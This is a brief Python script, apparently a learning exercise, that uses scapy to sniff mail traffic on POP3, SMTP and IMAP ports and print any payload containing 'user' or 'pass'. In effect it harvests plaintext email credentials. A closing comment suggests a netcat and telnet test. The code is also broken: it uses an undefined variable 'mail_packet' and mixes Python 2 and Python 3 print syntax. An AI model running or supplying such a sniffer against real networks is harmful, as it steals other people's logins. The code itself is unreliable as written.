from scapy.all import *


# our packet callback
def packet_callback(packet):
    print("Sniffer starting")
    if packet[TCP].payload:
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print "[*] Server %s" % packet[IP].dst  # packet ip destination
            print "[*] %s" % packet[TCP].payload

# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)


'''
alternative:
use netcat to listen on that port (25)
to test, run telnet to listen on local host.
    term1: nc -l -p localhost 25
    term2: telnet localhost 25

'''
